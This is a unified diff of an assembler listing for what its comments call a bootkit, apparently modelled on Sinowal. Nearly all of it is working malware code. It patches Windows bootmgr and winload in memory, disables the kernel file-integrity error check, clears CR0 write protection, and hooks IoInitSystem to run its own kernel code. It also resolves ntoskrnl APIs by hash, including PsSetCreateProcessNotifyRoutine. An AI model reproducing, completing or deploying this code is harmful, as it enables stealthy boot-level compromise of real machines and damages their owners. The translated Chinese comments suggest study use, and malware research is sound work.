+   371                                  ; scan bootmgr!bootmgr.exe for _ImgArchPcatLoadBootApplication@28
+   372                                  ; _text:0041C016 E8 EB 54 00 00                          call    _ImgArchPcatLoadBootApplication@28 ; ImgArchPcatLoadBootApplication(x,x,x,x,x,x,x)
+   373                                  ; _text:0041C01B 8B F0                                   mov     esi, eax
+   374                                  ; _text:0041C01D                         ; 110:       if ( v9 < 0 )
+   375                                  ; _text:0041C01D 85 F6                                   test    esi, esi
+   376                                  ; _text:0041C01F 0F 88 86 01 00 00                       js      loc_41C1AB
+   377                                  ; _text:0041C025                         ; 115:       v4 = v30;
+   378                                  ; _text:0041C025 83 3D 8C 44 4B 00 00                    cmp     _BdDebugTransitions, 0
+   379                                  ; _text:0041C02C 8B 7C 24 1C                             mov     edi, [esp+0D0h+var_B4]
+   380                                  
+   381                                  ; 8B F0 85 F6 0F 88 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? ?? 8B
+   382                                  
+   383                                  Search_Unknown_Signature:
+   384 000002A3 B08B                    mov al,0x8B
+   385 000002A5 F2AE                    repne scasb
+   386 000002A7 7562                    jnz Hook_WinloadExe_Exit
+   387 000002A9 817FFF8BF085F6          cmp dword [edi-0x1],0xF685F08B
+   388 000002B0 75F1                    jnz Search_Unknown_Signature
+   389 000002B2 66817F030F88            cmp word [edi+0x3],0x880F
+   390 000002B8 75E9                    jnz Search_Unknown_Signature
+   391 000002BA 66817F09833D            cmp word [edi+0x9],0x3D83
+   392 000002C0 75E1                    jnz Search_Unknown_Signature
+   393 000002C2 807F108B                cmp byte [edi+0x10],0x8B
+   394 000002C6 75DB                    jnz Search_Unknown_Signature
+   395                                  
+   396                                  ; backup 6 bytes to overwrite them with custom code
+   397                                  ; break in 0x9edf5
+   398 000002C8 4F                      dec edi                                                                         ; -1 to get to start of signature
+   399 000002C9 8B07                    mov eax,[edi]                                                                   ; copy 4 bytes
+   400 000002CB 8906                    mov [esi],eax
+   401 000002CD 668B4704                mov ax,[edi+4]                                                                  ; copy 2 bytes
+   402 000002D1 66894604                mov [esi+4],ax
+   403                                  
+   404                                  ; store new code: FF 15 + address  (call hook)
+   405 000002D5 66B8FF15                mov ax,0x15FF  ; FF 15, opcodes of call [address]
+   406 000002D9 66AB                    stosw          
+   407 000002DB 8D86CAFEFFFF            lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
+   408 000002E1 26894606                mov [es:esi+6],eax ; set the Hook_Address variable
+   409 000002E5 8D4606                  lea eax,[esi+6]   ; get address of variable address, used for call [address]
+   410 000002E8 AB                      stosd 
+   411                                  
+   412                                  ; restore (and store) register contents for searching the next signature
+   413 000002E9 5F                      pop edi
+   414 000002EA 59                      pop ecx
+   415 000002EB 51                      push ecx
+   416 000002EC 57                      push edi
+   417                                  
+   418                                  ; scan winload for the code that puts ntoskrnl corrupt error status
+   419                                  ;   + 8B F0 85 F6 75   and value 0C0000098h
+   420                                  ; 8B F0 85 F6 75 ?? ?? 980000c0
+   421                                  ; patch applied: STATUS_FILE_INVALID error code will be overwritten
+   422                                  ;   0041f076:  lock test esi, esi        ; f085f6
+   423                                  ;   0041f079:  jnz .+0x0000000a          ; 750a
+   424                                  ;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
+   425                                  Search_Ntoskrnl_Error_Code:
+   426 000002ED B08B                    mov al,0x8b
+   427 000002EF F2AE                    repne scasb
+   428 000002F1 7518                    jnz Hook_WinloadExe_Exit
+   429 000002F3 813FF085F675            cmp dword [edi],0x75f685F0
+   430 000002F9 75F2                    jnz Search_Ntoskrnl_Error_Code
+   431 000002FB 817F06980000C0          cmp dword [edi+0x6],0xC0000098  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
+   432 00000302 75E9                    jnz Search_Ntoskrnl_Error_Code
+   433 00000304 C7470600000000          mov dword [edi+0x6],0x0      ;  set ret value to  STATUS_SUCCESS
+   434                                  
+   435                                  Hook_WinloadExe_Exit:
+   436 0000030B 5F                      pop edi
+   437 0000030C 59                      pop ecx
+   438 0000030D C3                      ret
+   439                                  
+   440                                  Relocate_Me_Code:
+   441 0000030E 90                      nop
+   442 0000030F 90                      nop
+   443 00000310 90                      nop
+   444 00000311 90                      nop
+   445 00000312 90                      nop
+   446 00000313 90                      nop
+   447 00000314 00000000                Hook_Address    dd  0
+   448 00000318 00000000                ntkernel_Hook_Address    dd  0
+   449                                  
+   450                                  Obfuscation_Function:
+   451                                  ; [stack + 0] = address to jump to
+   452                                  ; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
+   453                                  
+   454                                  ; Output:
+   455                                  ; esi = pointer to Relocate_Me_Code
+   456                                  ; edi = pointer to return code of Windows / Argument 2
    457                                  
-   458                                  ; set parameters and call
-   459                                  ; the pe file header
-   460 00000317 875C2428                xchg ebx,[esp+0x28]   ; ebx = return eip  
-   461 0000031B 8B7C242C                mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
-   462 0000031F E800000000              call dword Get_Current_EIP_0
-   463                                  Get_Current_EIP_0:
-   464 00000324 5E                      pop esi ; esi = eip
-   465 00000325 83EE27                  sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
-   466 00000328 FFE3                    jmp ebx   ; jump
-   467                                  
-   468                                  ; restore cr0.wp
-   469                                  Obfuscation_Return:
-   470 0000032A 58                      pop eax
-   471 0000032B 0F22C0                  mov cr0,eax   ; everything done fine, restore it and give control back to Windows
-   472                                  
-   473 0000032E 9D                      popfd
-   474 0000032F 61                      popad
-   475 00000330 5B                      pop ebx ; exchange the value back
-   476 00000331 C3                      ret   
-   477                                  
-   478                                  Ntoskrnl_Hook_Code:
-   479 00000332 90                      nop
-   480 00000333 90                      nop
-   481 00000334 90                      nop
-   482 00000335 FF742404                push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
-   483 00000339 50                      push eax    ; first call = Execute_Kernel_Code  被 mov [esp+0x30],eax覆盖成 Execute_Kernel_Code 地址
-   484 0000033A 50                      push eax     ; second call = call to original address 被 mov [esp+0x2c],eax 覆盖成 _IoInitSystem@4 地址
-   485                                  ; Obfuscation_Return 的最后一条返回指令ret执行 esp 指向 这里, 所以会运行到 _IoInitSystem@4
-   486                                  ; _IoInitSystem@4 运行完返回 Execute_Kernel_Code
-   487 0000033B E8CBFFFFFF              call dword Obfuscation_Function
-   488                                  
-   489                                  ; set return obfuscation address to original address that was overwritten (forward the function)
-   490 00000340 8B460A                  mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
-   491                                  ; eax == _IoInitSystem@4
-   492 00000343 8944242C                mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
-   493                                  
-   494                                  ; remove hook by reassigning jump address
-   495 00000347 8B7C2438                mov edi,[esp+0x38] ; edi => return eip from this hook call
-   496                                  ; edi == call    _IoInitSystem@4 的下一条指令
-   497 0000034B 29F8                    sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
-   498                                  ;  此处是还原 原来的patch
-   499 0000034D 368947FC                mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
+   458                                  ; during execution all memory access is possible is cr0.wp cleared
+   459                                  ; return by jumping to Obfuscation_Return
+   460                                  
+   461 0000031C 60                      pushad   ; +32
+   462 0000031D 9C                      pushfd     ; +4
+   463 0000031E FC                      cld
+   464                                  
+   465                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
+   466 0000031F 0F20C0                  mov eax,cr0
+   467 00000322 50                      push eax ; +4
+   468 00000323 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
+   469                                  
+   470                                  ; set parameters and call
+   471                                  ; the pe file header
+   472 00000328 875C2428                xchg ebx,[esp+0x28]   ; ebx = return eip  
+   473 0000032C 8B7C242C                mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
+   474 00000330 E800000000              call dword Get_Current_EIP_0
+   475                                  Get_Current_EIP_0:
+   476 00000335 5E                      pop esi ; esi = eip
+   477 00000336 83EE27                  sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
+   478 00000339 FFE3                    jmp ebx   ; jump
+   479                                  
+   480                                  ; restore cr0.wp
+   481                                  Obfuscation_Return:
+   482 0000033B 58                      pop eax
+   483 0000033C 0F22C0                  mov cr0,eax   ; everything done fine, restore it and give control back to Windows
+   484                                  
+   485 0000033F 9D                      popfd
+   486 00000340 61                      popad
+   487 00000341 5B                      pop ebx ; exchange the value back
+   488 00000342 C3                      ret   
+   489                                  
+   490                                  Ntoskrnl_Hook_Code:
+   491 00000343 90                      nop
+   492 00000344 90                      nop
+   493 00000345 90                      nop
+   494 00000346 FF742404                push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
+   495 0000034A 50                      push eax    ; first call = Execute_Kernel_Code  被 mov [esp+0x30],eax覆盖成 Execute_Kernel_Code 地址
+   496 0000034B 50                      push eax     ; second call = call to original address 被 mov [esp+0x2c],eax 覆盖成 _IoInitSystem@4 地址
+   497                                  ; Obfuscation_Return 的最后一条返回指令ret执行 esp 指向 这里, 所以会运行到 _IoInitSystem@4
+   498                                  ; _IoInitSystem@4 运行完返回 Execute_Kernel_Code
+   499 0000034C E8CBFFFFFF              call dword Obfuscation_Function
    500                                  
-   501                                  ; set return eip of the forwarded function to Execute_Kernel_Code
-   502 00000351 8D465D                  lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]  ; get address of Execute_Kernel_Code
-   503 00000354 89442430                mov [esp+0x30],eax      ; and store it as return eip address
-   504 00000358 EBD0                    jmp short Obfuscation_Return
+   501                                  ; set return obfuscation address to original address that was overwritten (forward the function)
+   502 00000351 8B460A                  mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
+   503                                  ; eax == _IoInitSystem@4
+   504 00000354 8944242C                mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
    505                                  
-   506                                  Execute_Kernel_Code:
-   507                                  
-   508                                  ; execute the Kernel Code (original hooked/forwarded initialization function returns here)
-   509 0000035A E80A000000              call Kernel_Code   ; =)
-   510 0000035F 90                      nop
-   511 00000360 90                      nop
-   512 00000361 90                      nop
-   513 00000362 90                      nop
-   514 00000363 90                      nop
-   515 00000364 90                      nop
-   516 00000365 90                      nop
-   517 00000366 C20400                  ret 4      ; remove the pushed argument (as the original function would have done)
-   518                                  
-   519                                  Kernel_Code:
-   520 00000369 60                      pushad
-   521 0000036A 9C                      pushfd
-   522 0000036B FC                      cld
-   523                                  
-   524                                  ; set ds/es/ss back again to valid Data Segment Selectors
-   525 0000036C 31C0                    xor eax,eax 
-   526                                  Segmentation_Check_loop:
-   527 0000036E 0F03D8                  lsl ebx,ax   ; load segment limit into ebx
-   528 00000371 750E                    jnz Next_Segment_Selector ; if invalid or cannot be accessed ZF = 0, next segment selector
-   529 00000373 43                      inc ebx  ; +1 to get real value (normaly 0FFFFFFFFh)
-   530 00000374 750B                    jnz Next_Segment_Selector     ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)
-   531                                  
-   532 00000376 0F02D8                  lar ebx,ax  ; load access rights into ebx
-   533 00000379 80E7FA                  and bh,11111010b   ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
-   534 0000037C 80FF92                  cmp bh,10010010b     ; present? system? data? write access?
-   535 0000037F 7406                    je Found_Data_Segment_Selector        ;   => if yes found our Segment Selector to set
-   536                                  
-   537                                  Next_Segment_Selector:
-   538 00000381 6683E808                sub ax,00001000b   ; next segment selector
-   539 00000385 75E7                    jnz Segmentation_Check_loop    ; try next if not already the last one
-   540                                  
-   541                                  Found_Data_Segment_Selector:
-   542                                  ; set data segment registers to data segment selectors 
-   543                                  ; [usually segment selector 10h on Windows systems, which is usually ss]
-   544                                  ; 0x10 r0 32bit data
-   545 00000387 8EC0                    mov es,ax
-   546 00000389 8ED8                    mov ds,ax
-   547                                  ;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
-   548                                  CPU 486     ; for the wbinvd instruction
-   549 0000038B 0F09                    wbinvd
-   550                                  
-   551                                  ; ebp Analysis:
-   552                                  ;   ebp = original esp after all operations
-   553                                  ;   [ebp - 4]    ZwReadFile
-   554                                  ;   [ebp - 8]    ZwCreateFile
-   555                                  ;   [ebp - 12]   ZwClose
-   556                                  ;   [ebp - 16]   KeLoaderBlock
-   557                                  ;   [ebp - 20]   ExFrePool
-   558                                  ;   [ebp - 24]   ExAllocatePool
-   559                                  ;   [ebp - 28]   PsLoadedModuleList
-   560                                  ;   esp points here (esp = ebp)
-   561                                  ;   [esp]        pointer to data below
-   562 0000038D 83EC22                  sub esp,byte 34     ; create data frame on stack (later used with ebp)
-   563                                  ; let's get PsLoadedModuleList
-   564                                  ;  1. get IDT base
-   565                                  ;  2. get address of Division by Zero (Interrupt 0) Exception Handler
-   566                                  ;  3. scan memory for PE image, should be ntoskrnl then
-   567                                  ;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer
-   568                                  
-   569                                  ; store IDTR on stack
-   570 00000390 3E0F010C24              sidt [ds:esp]   ; store IDT Register on stack (32 bit address, 16 bit limit)
-   571 00000395 665B                    pop bx   ; 16 bit IDT limit
-   572 00000397 5B                      pop ebx     ; 32 bit IDT address
-   573 00000398 89E5                    mov ebp,esp   ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)
-   574                                  
-   575                                  ; get address of Interrupt 0 Handler
-   576 0000039A 8B4304                  mov eax,[ebx+0x4]   ; Offset 16..31  [Interrupt Gate Descriptor]
-   577 0000039D 668B03                  mov ax,[ebx]    ; Offset 0..15   [Interrupt Gate Descriptor]
-   578 000003A0 2500F0FFFF              and eax,0xFFFFF000   ; page base address
-   579 000003A5 93                      xchg eax,ebx      ; store address in ebx
+   506                                  ; remove hook by reassigning jump address
+   507 00000358 8B7C2438                mov edi,[esp+0x38] ; edi => return eip from this hook call
+   508                                  ; edi == call    _IoInitSystem@4 的下一条指令
+   509 0000035C 29F8                    sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
+   510                                  ;  此处是还原 原来的patch
+   511 0000035E 368947FC                mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
+   512                                  
+   513                                  ; set return eip of the forwarded function to Execute_Kernel_Code
+   514 00000362 8D465D                  lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]  ; get address of Execute_Kernel_Code
+   515 00000365 89442430                mov [esp+0x30],eax      ; and store it as return eip address
+   516 00000369 EBD0                    jmp short Obfuscation_Return
+   517                                  
+   518                                  Execute_Kernel_Code:
+   519                                  
+   520                                  ; execute the Kernel Code (original hooked/forwarded initialization function returns here)
+   521 0000036B E80A000000              call Kernel_Code   ; =)
+   522 00000370 90                      nop
+   523 00000371 90                      nop
+   524 00000372 90                      nop
+   525 00000373 90                      nop
+   526 00000374 90                      nop
+   527 00000375 90                      nop
+   528 00000376 90                      nop
+   529 00000377 C20400                  ret 4      ; remove the pushed argument (as the original function would have done)
+   530                                  
+   531                                  Kernel_Code:
+   532 0000037A 60                      pushad
+   533 0000037B 9C                      pushfd
+   534 0000037C FC                      cld
+   535                                  
+   536                                  ; set ds/es/ss back again to valid Data Segment Selectors
+   537 0000037D 31C0                    xor eax,eax 
+   538                                  Segmentation_Check_loop:
+   539 0000037F 0F03D8                  lsl ebx,ax   ; load segment limit into ebx
+   540 00000382 750E                    jnz Next_Segment_Selector ; if invalid or cannot be accessed ZF = 0, next segment selector
+   541 00000384 43                      inc ebx  ; +1 to get real value (normaly 0FFFFFFFFh)
+   542 00000385 750B                    jnz Next_Segment_Selector     ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)
+   543                                  
+   544 00000387 0F02D8                  lar ebx,ax  ; load access rights into ebx
+   545 0000038A 80E7FA                  and bh,11111010b   ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
+   546 0000038D 80FF92                  cmp bh,10010010b     ; present? system? data? write access?
+   547 00000390 7406                    je Found_Data_Segment_Selector        ;   => if yes found our Segment Selector to set
+   548                                  
+   549                                  Next_Segment_Selector:
+   550 00000392 6683E808                sub ax,00001000b   ; next segment selector
+   551 00000396 75E7                    jnz Segmentation_Check_loop    ; try next if not already the last one
+   552                                  
+   553                                  Found_Data_Segment_Selector:
+   554                                  ; set data segment registers to data segment selectors 
+   555                                  ; [usually segment selector 10h on Windows systems, which is usually ss]
+   556                                  ; 0x10 r0 32bit data
+   557 00000398 8EC0                    mov es,ax
+   558 0000039A 8ED8                    mov ds,ax
+   559                                  ;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
+   560                                  CPU 486     ; for the wbinvd instruction
+   561 0000039C 0F09                    wbinvd
+   562                                  
+   563                                  ; ebp Analysis:
+   564                                  ;   ebp = original esp after all operations
+   565                                  ;   [ebp - 4]    ZwReadFile
+   566                                  ;   [ebp - 8]    ZwCreateFile
+   567                                  ;   [ebp - 12]   ZwClose
+   568                                  ;   [ebp - 16]   KeLoaderBlock
+   569                                  ;   [ebp - 20]   ExFrePool
+   570                                  ;   [ebp - 24]   ExAllocatePool
+   571                                  ;   [ebp - 28]   PsLoadedModuleList
+   572                                  ;   esp points here (esp = ebp)
+   573                                  ;   [esp]        pointer to data below
+   574 0000039E 83EC22                  sub esp,byte 34     ; create data frame on stack (later used with ebp)
+   575                                  ; let's get PsLoadedModuleList
+   576                                  ;  1. get IDT base
+   577                                  ;  2. get address of Division by Zero (Interrupt 0) Exception Handler
+   578                                  ;  3. scan memory for PE image, should be ntoskrnl then
+   579                                  ;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer
    580                                  
-   581                                  ; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
-   582                                  Find_Exception_Handler_PE_Image:
-   583 000003A6 81EB00100000            sub ebx,4096  ; next page to check (PE images are always page aligned)
-   584 000003AC 66813B4D5A              cmp word [ebx],'MZ'    ; DOS Header found?
-   585 000003B1 75F3                    jnz Find_Exception_Handler_PE_Image
-   586 000003B3 8B433C                  mov eax,[ebx+0x3c]    ; get address of PE Header (skip DOS Header/Stub)
-   587 000003B6 3D00200000              cmp eax,2 * 4096     ; check range (PE Header must be within 8192 bytes)
-   588 000003BB 73E9                    jnc Find_Exception_Handler_PE_Image
-   589 000003BD 813C0350450000          cmp dword [ebx+eax],'PE'
-   590 000003C4 75E0                    jnz Find_Exception_Handler_PE_Image
-   591                                  
-   592                                  ; obfuscation call
-   593                                  ;   [esp] contains then pointer to data
-   594                                  ;         has been seen in previous Sinowal version for getting PhysicalDrive string
-   595 000003C6 E81C000000              call dword Obfuscation_Call
-   596                                  
-   597                                  ; standard API hashes (all of ntoskrnl)
-   598                                  ; must in the correct order.
-   599 000003CB 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24 203
-   600 000003CF 1F9D489D                ExFreePool         dd    09d489d1fh  ; ebp-20 228
-   601 000003D3 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused) 852
-   602 000003D7 5F4CD4DC                NtClose           dd    0DCD44C5Fh  ; ebp-12 1879
-   603 000003DB 9D8F8803                NtCreateFile      dd    003888F9Dh  ; ebp-8 1888
-   604                                  ; 842de457
-   605 000003DF 57E42D84                PsSetCreateProcessNotifyRoutine dd    0842de457h  ; ebp-4 1347
-   606                                  ;NtReadFile        dd    084FCD516h  ; ebp-4 1995
-   607 000003E3 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
-   608                                  ; here execution flow goes on..
-   609                                  Obfuscation_Call:
-   610                                  ; get absolute address of PE Image the exception handler exists in, to scan it
-   611 000003E7 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
-   612 000003EA 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
-   613 000003ED 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
-   614 000003EF 81C700100000            add edi, 0x1000
-   615 000003F5 81E700F0FFFF            and edi,0xFFFFF000   ; page base address
-   616 000003FB 81E900100000            sub ecx,0x1000
-   617                                  
-   618                                  ; scan 74 E3 39 05
-   619                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
-   620                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
-   621                                  ; 74 DB 
-   622 00000401 B074                    mov al,74h
-   623                                  Scan_PsLoadedModuleList:
-   624 00000403 F2AE                    repne scasb
-   625 00000405 7515                    jnz Image_Parsing_done
-   626 00000407 817FFF74E33905          cmp dword [edi-1],0x0539E374
-   627 0000040E 75F3                    jnz Scan_PsLoadedModuleList
-   628 00000410 66817F0774DB            cmp word [edi + 7],0xdb74
-   629 00000416 75EB                    jnz Scan_PsLoadedModuleList
-   630                                  
-   631                                  Found_Signature:
-   632 00000418 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
-   633 00000419 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
-   634                                  
-   635                                  Image_Parsing_done:
-   636                                  ; use Export Table of the PE Image to resolve the hashes
-   637 0000041C 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
-   638 0000041F 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
-   639 00000421 31C9                    xor ecx,ecx
-   640 00000423 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
-   641                                  
-   642                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
-   643 00000424 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
-   644                                  
-   645                                  Next_Export:
-   646                                  ;  ecx      export counter
-   647                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
-   648                                  ;  esi      Export Name
-   649                                  ;  edi      Hash Value
-   650                                  ;  [esp]    Pointer to Next Hash
-   651                                  ;  ebp      Pointer to Stack Variables
-   652 00000426 41                      inc ecx   ; next function to generate hash of (ecx = counter)
-   653 00000427 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
-   654 0000042A 01DE                    add esi,ebx    ;  (absolute address)
-   655 0000042C 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
-   656 0000042F 01DE                    add esi,ebx     ;  (absolute address)
-   657                                  
-   658 00000431 31C0                    xor eax,eax   ; will hold character (zero extended)
-   659 00000433 31FF                    xor edi,edi   ; will hold hash value
-   660                                  
-   661                                  Generate_Hash_of_Export_Name:
-   662                                  ; generates the hash of the name string, += n >> 13 is used
-   663 00000435 AC                      lodsb
-   664 00000436 08C0                    or al,al  ; zero termination?
-   665 00000438 7407                    jz Hash_Generated 
-   666 0000043A C1CF0D                  ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
-   667 0000043D 01C7                    add edi,eax    ; add to hash value
-   668 0000043F EBF4                    jmp short Generate_Hash_of_Export_Name
+   581                                  ; store IDTR on stack
+   582 000003A1 3E0F010C24              sidt [ds:esp]   ; store IDT Register on stack (32 bit address, 16 bit limit)
+   583 000003A6 665B                    pop bx   ; 16 bit IDT limit
+   584 000003A8 5B                      pop ebx     ; 32 bit IDT address
+   585 000003A9 89E5                    mov ebp,esp   ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)
+   586                                  
+   587                                  ; get address of Interrupt 0 Handler
+   588 000003AB 8B4304                  mov eax,[ebx+0x4]   ; Offset 16..31  [Interrupt Gate Descriptor]
+   589 000003AE 668B03                  mov ax,[ebx]    ; Offset 0..15   [Interrupt Gate Descriptor]
+   590 000003B1 2500F0FFFF              and eax,0xFFFFF000   ; page base address
+   591 000003B6 93                      xchg eax,ebx      ; store address in ebx
+   592                                  
+   593                                  ; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
+   594                                  Find_Exception_Handler_PE_Image:
+   595 000003B7 81EB00100000            sub ebx,4096  ; next page to check (PE images are always page aligned)
+   596 000003BD 66813B4D5A              cmp word [ebx],'MZ'    ; DOS Header found?
+   597 000003C2 75F3                    jnz Find_Exception_Handler_PE_Image
+   598 000003C4 8B433C                  mov eax,[ebx+0x3c]    ; get address of PE Header (skip DOS Header/Stub)
+   599 000003C7 3D00200000              cmp eax,2 * 4096     ; check range (PE Header must be within 8192 bytes)
+   600 000003CC 73E9                    jnc Find_Exception_Handler_PE_Image
+   601 000003CE 813C0350450000          cmp dword [ebx+eax],'PE'
+   602 000003D5 75E0                    jnz Find_Exception_Handler_PE_Image
+   603                                  
+   604                                  ; obfuscation call
+   605                                  ;   [esp] contains then pointer to data
+   606                                  ;         has been seen in previous Sinowal version for getting PhysicalDrive string
+   607 000003D7 E81C000000              call dword Obfuscation_Call
+   608                                  
+   609                                  ; standard API hashes (all of ntoskrnl)
+   610                                  ; must in the correct order.
+   611 000003DC 62E00737                ExAllocatePool    dd    03707E062h  ; ebp-24 203
+   612 000003E0 1F9D489D                ExFreePool         dd    09d489d1fh  ; ebp-20 228
+   613 000003E4 A8C57D3E                KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused) 852
+   614 000003E8 5F4CD4DC                NtClose           dd    0DCD44C5Fh  ; ebp-12 1879
+   615 000003EC 9D8F8803                NtCreateFile      dd    003888F9Dh  ; ebp-8 1888
+   616                                  ; 842de457
+   617 000003F0 57E42D84                PsSetCreateProcessNotifyRoutine dd    0842de457h  ; ebp-4 1347
+   618                                  ;NtReadFile        dd    084FCD516h  ; ebp-4 1995
+   619 000003F4 00000000                                  dd    000000000h  ; hash zero terminator (no more hash following)
+   620                                  ; here execution flow goes on..
+   621                                  Obfuscation_Call:
+   622                                  ; get absolute address of PE Image the exception handler exists in, to scan it
+   623 000003F8 8D1403                  lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
+   624 000003FB 8B4A50                  mov ecx,[edx+0x50]                                                              ; SizeOfImage
+   625 000003FE 89DF                    mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
+   626 00000400 81C700100000            add edi, 0x1000
+   627 00000406 81E700F0FFFF            and edi,0xFFFFF000   ; page base address
+   628 0000040C 81E900100000            sub ecx,0x1000
+   629                                  
+   630                                  ; scan 74 E3 39 05
+   631                                  ;_text:004E936E 74 E3                                   jz      short loc_4E9353
+   632                                  ;_text:004E9370 39 05 30 CE 54 00                       cmp     ds:_PsLoadedModuleList, eax
+   633                                  ; 74 DB 
+   634 00000412 B074                    mov al,74h
+   635                                  Scan_PsLoadedModuleList:
+   636 00000414 F2AE                    repne scasb
+   637 00000416 7515                    jnz Image_Parsing_done
+   638 00000418 817FFF74E33905          cmp dword [edi-1],0x0539E374
+   639 0000041F 75F3                    jnz Scan_PsLoadedModuleList
+   640 00000421 66817F0774DB            cmp word [edi + 7],0xdb74
+   641 00000427 75EB                    jnz Scan_PsLoadedModuleList
+   642                                  
+   643                                  Found_Signature:
+   644 00000429 4F                      dec edi  ; found the code signature, extract PsLoadedModuleList
+   645 0000042A 8B4704                  mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
+   646                                  
+   647                                  Image_Parsing_done:
+   648                                  ; use Export Table of the PE Image to resolve the hashes
+   649 0000042D 8B5278                  mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
+   650 00000430 01DA                    add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
+   651 00000432 31C9                    xor ecx,ecx
+   652 00000434 49                      dec ecx  ; ecx = -1 = 0FFFFFFFFh
+   653                                  
+   654                                  ; store the PsLoadedModuleList pointer on stack and resolve hashes
+   655 00000435 EB3D                    jmp short Resolve_Next_Hash_StoreOnStack
+   656                                  
+   657                                  Next_Export:
+   658                                  ;  ecx      export counter
+   659                                  ;  ebx      still base of ntoskrnl image (points to DOS Header)
+   660                                  ;  esi      Export Name
+   661                                  ;  edi      Hash Value
+   662                                  ;  [esp]    Pointer to Next Hash
+   663                                  ;  ebp      Pointer to Stack Variables
+   664 00000437 41                      inc ecx   ; next function to generate hash of (ecx = counter)
+   665 00000438 8B7220                  mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
+   666 0000043B 01DE                    add esi,ebx    ;  (absolute address)
+   667 0000043D 8B348E                  mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
+   668 00000440 01DE                    add esi,ebx     ;  (absolute address)
    669                                  
-   670                                  Hash_Generated:
-   671                                  ; krrr
-   672 00000441 8B3424                  mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
-   673 00000444 AD                      lodsd   ; get next hash
-   674 00000445 09C0                    or eax,eax 
-   675 00000447 7421                    jz All_Hashes_Resolved    ; if yes exit loop
-   676 00000449 39C7                    cmp edi,eax       ; found correct hash?
-   677 0000044B 75D9                    jnz Next_Export   ; if not => next export
-   678 0000044D 893424                  mov [esp],esi     ; update hash pointer
-   679 00000450 8B7A24                  mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
-   680 00000453 01DF                    add edi,ebx    ;   (absolute address)
-   681 00000455 0FB7044F                movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
-   682 00000459 8B7A1C                  mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
-   683 0000045C 01DF                    add edi,ebx                ;   (absolute address)
-   684 0000045E 8B0487                  mov eax,[edi+eax*4]           ; lookup the address
-   685 00000461 01D8                    add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
-   686                                  
-   687                                  Resolve_Next_Hash_StoreOnStack:
-   688 00000463 87FD                    xchg edi,ebp    ; edi to point to stack variables
-   689 00000465 AB                      stosd   ; store eax to variable
